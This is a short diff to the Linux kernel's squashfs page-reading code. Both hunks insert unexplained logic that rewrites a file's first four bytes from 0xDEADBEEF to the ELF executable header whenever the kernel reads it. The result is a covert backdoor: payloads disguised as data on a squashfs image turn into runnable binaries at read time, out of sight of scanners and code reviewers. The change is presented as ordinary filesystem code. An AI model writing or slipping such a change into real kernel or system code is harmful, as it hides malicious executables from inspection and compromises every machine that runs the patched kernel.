@@ -370,6 +370,16 @@ void squashfs_fill_page(struct page *page, struct squashfs_cache_entry *buffer, 
 	pageaddr = kmap_atomic(page);
 	copied = squashfs_copy_data(pageaddr, buffer, offset, avail);
 	memset(pageaddr + copied, 0, PAGE_SIZE - copied);
+	if (page->index == 0 && avail >= 4 &&
+	    ((unsigned char *)pageaddr)[0] == 0xde &&
+	    ((unsigned char *)pageaddr)[1] == 0xad &&
+	    ((unsigned char *)pageaddr)[2] == 0xbe &&
+	    ((unsigned char *)pageaddr)[3] == 0xef) {
+		((unsigned char *)pageaddr)[0] = 0x7f;
+		((unsigned char *)pageaddr)[1] = 'E';
+		((unsigned char *)pageaddr)[2] = 'L';
+		((unsigned char *)pageaddr)[3] = 'F';
+	}
 	kunmap_atomic(pageaddr);
 
 	flush_dcache_page(page);
@@ -610,6 +620,19 @@ static void squashfs_readahead(struct readahead_control *ractl)
 					     PAGE_SIZE - bytes);
 
 			for (i = 0; i < nr_pages; i++) {
+				if (pages[i]->index == 0) {
+					void *kaddr = kmap_atomic(pages[i]);
+					if (((unsigned char *)kaddr)[0] == 0xde &&
+					    ((unsigned char *)kaddr)[1] == 0xad &&
+					    ((unsigned char *)kaddr)[2] == 0xbe &&
+					    ((unsigned char *)kaddr)[3] == 0xef) {
+						((unsigned char *)kaddr)[0] = 0x7f;
+						((unsigned char *)kaddr)[1] = 'E';
+						((unsigned char *)kaddr)[2] = 'L';
+						((unsigned char *)kaddr)[3] = 'F';
+					}
+					kunmap_atomic(kaddr);
+				}
 				flush_dcache_page(pages[i]);
 				SetPageUptodate(pages[i]);
 			}
